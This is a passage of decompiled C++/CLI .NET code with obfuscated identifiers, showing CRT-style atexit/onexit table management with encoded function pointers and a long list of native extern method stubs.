      \u0083ú.\u0081é();
      return \u0083ú.\u0081ö();
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081\u00A0()
    {
      --\u0083ú.\u0083È;
      if (\u0083ú.\u0083È != 0)
        return;
      \u0083ú.\u0081\u00AC();
    }

    [SecurityCritical]
    internal static unsafe int \u0081\u009A(
      __FnPtr<void ()> _param0,
      uint* _param1,
      __FnPtr<void ()>** _param2,
      __FnPtr<void ()>** _param3)
    {
      // ISSUE: cast to a function pointer type
      __FnPtr<void ()> local1 = (__FnPtr<void ()>) 0;
      if (_param0 == null)
        return -1;
      int num1;
      if (\u0083ú.ë())
      {
        try
        {
          __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u0083ú.ì((void*) *(int*) _param3);
          __FnPtr<void ()>* local3 = (__FnPtr<void ()>*) \u0083ú.ì((void*) *(int*) _param2);
          int num2 = (int) ((IntPtr) local3 - (IntPtr) local2);
          if (*_param1 - 1U < (uint) num2 >> 2)
          {
            try
            {
              uint num3 = *_param1 * 4U;
              uint num4 = num3 >= 2048U ? 2048U : num3;
              IntPtr cb = new IntPtr((int) num3 + (int) num4);
              IntPtr num5 = Marshal.ReAllocHGlobal(new IntPtr((void*) local2), cb);
              local3 = (__FnPtr<void ()>*) ((IntPtr) num5.ToPointer() + num2);
              local2 = (__FnPtr<void ()>*) num5.ToPointer();
              uint num6 = *_param1;
              uint num7 = 512U >= num6 ? num6 : 512U;
              *_param1 = num6 + num7;
            }
            catch (OutOfMemoryException ex)
            {
              IntPtr cb = new IntPtr((int) *_param1 * 4 + 8);
              IntPtr num8 = Marshal.ReAllocHGlobal(new IntPtr((void*) local2), cb);
              local3 = (__FnPtr<void ()>*) ((IntPtr) num8.ToPointer() - (IntPtr) local2 + (IntPtr) local3);
              local2 = (__FnPtr<void ()>*) num8.ToPointer();
              uint* numPtr = _param1;
              int num9 = (int) *numPtr + 4;
              *numPtr = (uint) num9;
            }
          }
          *(int*) local3 = (int) _param0;
          __FnPtr<void ()>* local4 = (__FnPtr<void ()>*) ((IntPtr) local3 + 4);
          local1 = _param0;
          *(int*) _param3 = (int) \u0083ú.ã((void*) local2);
          *(int*) _param2 = (int) \u0083ú.ã((void*) local4);
        }
        catch (OutOfMemoryException ex)
        {
        }
        finally
        {
          \u0083ú.\u0081\u00B2();
        }
        if (local1 != null)
        {
          num1 = 0;
          goto label_12;
        }
      }
      num1 = -1;
label_12:
      return num1;
    }

    [SecurityCritical]
    internal static unsafe void \u0081\u008A()
    {
      if (\u0083ú.é == 0U)
        return;
      __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ã);
      __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ß);
      if ((IntPtr) local1 != new IntPtr(-1) && (IntPtr) local1 != IntPtr.Zero && (IntPtr) local2 != IntPtr.Zero)
      {
        __FnPtr<void ()>* local3 = local1;
        __FnPtr<void ()>* local4 = local2;
        while (true)
        {
          __FnPtr<void ()>* local5;
          __FnPtr<void ()>* local6;
          do
          {
            do
            {
              local2 -= 4;
              if (local2 < local1)
                goto label_7;
            }
            while ((IntPtr) *(int*) local2 == (IntPtr) \u0083ú.æ());
            void* voidPtr = \u0083ú.ì((void*) *(int*) local2);
            *(int*) local2 = (int) \u0083ú.æ();
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            __calli((__FnPtr<void ()>) (IntPtr) voidPtr)();
            local5 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ã);
            local6 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ß);
          }
          while (local3 == local5 && local4 == local6);
          local3 = local5;
          local1 = local5;
          local4 = local6;
          local2 = local6;
        }
label_7:
        Marshal.FreeHGlobal(new IntPtr((void*) local1));
      }
      \u0083ú.\u0081\u00A0();
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int \u0081\u0086()
    {
      if (!\u0083ú.\u0081\u00A9())
        return 0;
      \u0083ú.\u0083ã = (__FnPtr<void ()>*) \u0083ú.ã(Marshal.AllocHGlobal(128).ToPointer());
      \u0083ú.\u0083ß = \u0083ú.\u0083ã;
      \u0083ú.é = 32U;
      return 1;
    }

    internal static __FnPtr<int ()> \u0081\u0082(__FnPtr<int ()> _param0) => \u0083ú.ü((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    [SecurityCritical]
    internal static unsafe int ü(__FnPtr<void ()> _param0) => \u0083ú.\u0081\u009A((__FnPtr<void ()>) (IntPtr) \u0083ú.ã((void*) _param0), &\u0083ú.é, &\u0083ú.\u0083ß, &\u0083ú.\u0083ã);

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int \u00AB()
    {
      if (\u0083ú.\u0081\u00A9())
      {
        \u0083ú.\u0083ù = (__FnPtr<void ()>*) \u0083ú.ã(Marshal.AllocHGlobal(128).ToPointer());
        \u0083ú.\u0083é = \u0083ú.\u0083ù;
        \u0083ú.\u0084 = 32U;
      }
      return 1;
    }

    [HandleProcessCorruptedStateExceptions]
    [SecurityCritical]
    internal static unsafe void \u00A3()
    {
      if (\u0083ú.\u0084 == 0U)
        return;
      __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ù);
      __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083é);
      try
      {
        if ((IntPtr) local1 == new IntPtr(-1) || (IntPtr) local1 == IntPtr.Zero || (IntPtr) local2 == IntPtr.Zero)
          return;
        __FnPtr<void ()>* local3 = local1;
        __FnPtr<void ()>* local4 = local2;
        while (true)
        {
          __FnPtr<void ()>* local5;
          __FnPtr<void ()>* local6;
          do
          {
            do
            {
              local2 -= 4;
            }
            while (local2 >= local1 && (IntPtr) *(int*) local2 == (IntPtr) \u0083ú.æ());
            if (local2 >= local1)
            {
              // ISSUE: cast to a function pointer type
              __FnPtr<void ()> local7 = (__FnPtr<void ()>) (IntPtr) \u0083ú.ì((void*) *(int*) local2);
              *(int*) local2 = (int) \u0083ú.æ();
              // ISSUE: function pointer call
              __calli(local7)();
              local5 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ù);
              local6 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083é);
            }
            else
              goto label_12;
          }
          while (local3 == local5 && local4 == local6);
          local3 = local5;
          local1 = local5;
          local4 = local6;
          local2 = local6;
        }
label_12:;
      }
      finally
      {
        Marshal.FreeHGlobal(new IntPtr((void*) local1));
        \u0083ú.\u0081\u00A0();
      }
    }

    [SecurityCritical]
    internal static __FnPtr<int ()> ó(__FnPtr<int ()> _param0) => \u0083ú.ï((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int ï(__FnPtr<void ()> _param0) => \u0083ú.\u0081\u009A((__FnPtr<void ()>) (IntPtr) \u0083ú.ã((void*) _param0), &\u0083ú.\u0084, &\u0083ú.\u0083é, &\u0083ú.\u0083ù);

    [SecurityCritical]
    [SuppressUnmanagedCodeSecurity]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DllImport("KERNEL32.dll", EntryPoint = "DecodePointer")]
    public static extern unsafe void* ì(void* _param0);

    [SuppressUnmanagedCodeSecurity]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    [DllImport("MSVCR100.dll", EntryPoint = "_encoded_null", CallingConvention = CallingConvention.Cdecl)]
    public static extern unsafe void* æ();

    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [DllImport("KERNEL32.dll", EntryPoint = "EncodePointer")]
    public static extern unsafe void* ã(void* _param0);

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int à(__FnPtr<int ()>* _param0, __FnPtr<int ()>* _param1)
    {
      int num1 = 0;
      if (_param0 < _param1)
      {
        while (num1 == 0)
        {
          uint num2 = (uint) *(int*) _param0;
          if (num2 != 0U)
          {
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            num1 = __calli((__FnPtr<int ()>) (int) num2)();
          }
          _param0 += 4;
          if (_param0 >= _param1)
            break;
        }
      }
      return num1;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void Ú(__FnPtr<void ()>* _param0, __FnPtr<void ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) (int) num)();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    internal static ModuleHandle Ø() => typeof (\u0081\u008D).Module.ModuleHandle;

    [SecurityCritical]
    [DebuggerStepThrough]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void É(__FnPtr<void* ()>* _param0, __FnPtr<void* ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          void* voidPtr = __calli(\u0083ú.Æ((__FnPtr<void* ()>) (int) num))();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe __FnPtr<void* ()> Æ(__FnPtr<void* ()> _param0) => (__FnPtr<void* ()>) (IntPtr) \u0083ú.Ø().ResolveMethodHandle((int) _param0).GetFunctionPointer().ToPointer();

    [SecurityCritical]
    [HandleProcessCorruptedStateExceptions]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void µ(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00A8((\u0081\u00BD*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [SecurityCritical]
    [HandleProcessCorruptedStateExceptions]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void \u0083Î(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00A8((\u0081\u00BD*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    [HandleProcessCorruptedStateExceptions]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void \u00A2(
      __FnPtr<void (void*, uint, int, __FnPtr<void (void*)>)> _param0,
      void* _param1,
      uint _param2,
      int _param3,
      __FnPtr<void (void*)> _param4)
    {
      try
      {
        void* voidPtr = _param1;
        int num1 = (int) _param2;
        int num2 = _param3;
        __FnPtr<void (void*)> local = _param4;
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli(_param0)((__FnPtr<void (void*)>) (IntPtr) voidPtr, num1, (uint) num2, (void*) local);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00A8((\u0081\u00BD*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    internal static int \u0098() => 0;

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0083º();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0095([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0091([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u008D();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0089();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0085([In] int obj0, [In] void* obj1, [In] void* obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0083\u0098([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0083\u00F7([In] byte* obj0, [In] void** obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0083ð([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0083ë();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe uint \u0083ç([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082ú([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u0082([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Ú([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Ö([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Í([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Å([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0083\u00BE([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00B4([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00AC(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] sbyte** obj3,
      [In] byte obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00AC(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6,
      [In] byte obj7);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00A3(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00A3(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u009C(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte** obj5);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u009C(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte* obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u009C(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] byte* obj5,
      [In] ushort obj6,
      [In] ushort obj7,
      [In] sbyte** obj8);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u0095([In] byte* obj0, [In] uint* obj1, [In] byte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u008E([In] byte* obj0, [In] byte* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u008F(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u008F(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] sbyte* obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u008F(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] byte* obj3,
      [In] ushort obj4,
      [In] ushort obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u0088([In] byte* obj0, [In] void* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083ì([In] byte* obj0, [In] void* obj1, [In] sbyte* obj2, [In] byte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082î([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2, [In] ulong* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082î([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082æ(
      [In] byte* obj0,
      [In] void* obj1,
      [In] uint obj2,
      [In] ulong obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082æ([In] byte* obj0, [In] void* obj1, [In] uint obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082Þ([In] byte* obj0, [In] ulong obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082Ù([In] byte* obj0, [In] sbyte* obj1, [In] int obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082Ð([In] byte* obj0, [In] sbyte* obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0082Ë([In] byte* obj0, [In] sbyte* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0082Ä();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern ulong \u0082À();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern long \u0082\u00B8();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern ulong \u0082\u00B0();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0082\u00A6();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u00A3(
      [In] byte* obj0,
      [In] void* obj1,
      [In] int* obj2,
      [In] sbyte* obj3,
      [In] int obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u00A3([In] byte* obj0, [In] void* obj1, [In] int obj2, [In] int obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0082\u00A0([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0082\u0098();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0082\u0093([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0082\u008B([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0082\u0085([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0081\u009F([In] void* obj0, [In] int obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081û();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081\u0092([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081ô([In] void* obj0, [In] void* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081í([In] void* obj0, [In] void* obj1, [In] int obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0081ç();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0024([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0081á();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0081Ú([In] uint obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0083\u00B1();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081Ö();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0081Î([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081Ë(
      [In] void* obj0,
      [In] \u0082\u0081 obj1,
      [In] void* obj2,
      [In] uint obj3);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081Ç([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int* \u0081À();

    [SuppressUnmanagedCodeSecurity]
